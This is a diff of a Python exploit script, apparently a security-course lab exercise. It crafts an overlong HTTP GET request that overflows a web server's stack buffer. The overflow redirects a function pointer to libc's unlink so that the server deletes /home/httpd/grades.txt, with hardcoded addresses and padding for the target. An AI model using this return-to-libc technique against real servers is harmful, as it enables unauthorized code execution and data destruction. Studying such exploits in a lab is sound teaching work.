@@ -17,9 +17,12 @@ import struct
 # which you can then use in build_exploit(); the following are just
 # examples.
 
-stack_buffer = 0xbfffe6d8 
-stack_saved_ebp = 0xbfffeee8
-stack_retaddr = stack_saved_ebp + 4
+stack_buffer = 0xbfffd9fc 
+function_pointer = 0xbfffddfc
+
+libc_unlink_addr = 0x40102450 
+path_arg_addr = 0x08050e90 
+libc_exit_addr = 0x40058150
 
 
 # This is the function that you should modify to construct an
@@ -40,15 +43,36 @@ def build_exploit(shellcode):
     # strings, not byte strings. You should take care to use the latter over
     # the former (e.g. b'hello world').
 
-    hello = b'/'
-    hello += shellcode
-    for i in range(2067-len(shellcode)):
+    targetsize = function_pointer - stack_buffer 
+    hello = b'/../grades.txt'
+    targetsize = targetsize - len(hello)  
+    # Program appends /home/httpd/lab
+    targetsize = targetsize - 15
+
+    for i in range(targetsize):
         hello += b'A'
-    hello += b'\xbb\xbb\xbb\xbb' # Reverse order because of endianism
-    test = b'GET ' + hello + b' HTTP/1.0\r\n' + b'\r\n'
+    hello += b'\x50\x24\x10\x40' # <unlink>
+    #hello += b'\x99\x98\x97\x96'
+    #hello += b'\x95\x94\x93\x92'
+    #hello += b'\x91\x90\x89\x88'
+    #hello += b'\x87\x86\x85\x84' # Apparently this was return address
 
+    hello += b'padd'
+    hello += b'padd'
+    hello += b'padd'
+    hello += b'\x50\x81\x05\x40'
+    hello += b'\x14\xde\xff\xbf'
+    # string at 0xbfffde14
+    hello += b'/home/httpd/grades.txt'
+
+
+
+
+    test = b''
+    test += b'GET '
+    test += hello
+    test += b' HTTP/1.0\r\n\r\n'
     return test
-
 
 def send_req(host, port, req):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
